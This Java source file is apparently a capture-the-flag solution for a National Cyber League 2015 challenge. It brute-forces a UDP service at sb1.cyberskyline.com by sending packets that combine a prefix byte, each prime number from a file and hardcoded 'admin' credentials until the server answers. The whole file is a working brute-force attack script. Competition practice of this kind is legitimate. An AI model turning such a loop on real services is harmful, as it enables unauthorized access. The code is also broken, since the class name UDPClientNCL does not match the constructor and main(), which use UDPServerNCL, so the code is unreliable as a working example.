package NCL2015;
import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;

public class UDPClientNCL {
    public DatagramSocket clientSocket;
    public InetAddress IPAddress;
    public UDPServerNCL (DatagramSocket clientSocket,InetAddress IPAddress) {
            this.clientSocket = clientSocket;
            this.IPAddress = IPAddress;
    }

    public class Listener extends Thread { //listener thread waits for the right message
        private byte[] receiveData = new byte[1024];

        public void run() {

            while (true) {
                try {
                    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                    clientSocket.receive(receivePacket);
                    String modifiedSentence = new String(receivePacket.getData());
                    System.out.println("FROM SERVER:" + modifiedSentence);
                    String doc = new String(receivePacket.getData(), "ISO-8859-1");
                    System.out.println("FROM SERVER:" + doc);
                    System.exit(1); //when server replied print the message and exit
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }

    }
    public byte[] concatenateByteArrays(byte[] a, byte[] b) {//concat two byte arrays to make a single byte array
        byte[] result = new byte[a.length + b.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }
    public class Sender extends Thread { //sender thread
        private byte[] Pre = {0x78}; //pre byte
        private byte[] username = "adminadminadminadminadmina".getBytes(); //26 bytes username
        private byte[] password = "adminadminadminadminadmina".getBytes(); //26 bytes password
        private byte[] second;


        public void run() {
            second = concatenateByteArrays(username,password);
            File file = new File("20.txt"); //file contains prime numbers smaller than 20 million
            try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                try {
                    for (String line; (line = br.readLine()) != null; ) { //read each line's number until reach the EOF
                        int num = Integer.parseInt(line);
                        ByteBuffer b = ByteBuffer.allocate(4);
                        b.putInt(num);
                        byte[] result = b.array();
                        byte[] first = concatenateByteArrays(Pre, result); //create the first part of the packet with the prime number
                        byte[] send = concatenateByteArrays(first, second); //create the whole packet
                        DatagramPacket sendPacket = new DatagramPacket(send, send.length, IPAddress, 3050);
                        clientSocket.send(sendPacket);
                        String doc1 = new String(send, "ISO-8859-1");
                        System.out.println("Sending " + doc1);
                        System.out.println("Sending " + send.toString());
                    }


                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
        public void start() { //start() will start both threads
            Listener listener = new Listener();
            Sender sender = new Sender();

            listener.start();
            sender.start();
        }

        public static void main(String[] args) {
            try {
                DatagramSocket clientSocket = new DatagramSocket();
                InetAddress IPAddress = InetAddress.getByName("sb1.cyberskyline.com");
                UDPServerNCL server = new UDPServerNCL(clientSocket,IPAddress);
                server.start();
            } catch (UnknownHostException e) {
                e.printStackTrace();
            } catch (SocketException e) {
                e.printStackTrace();
            }
        }

}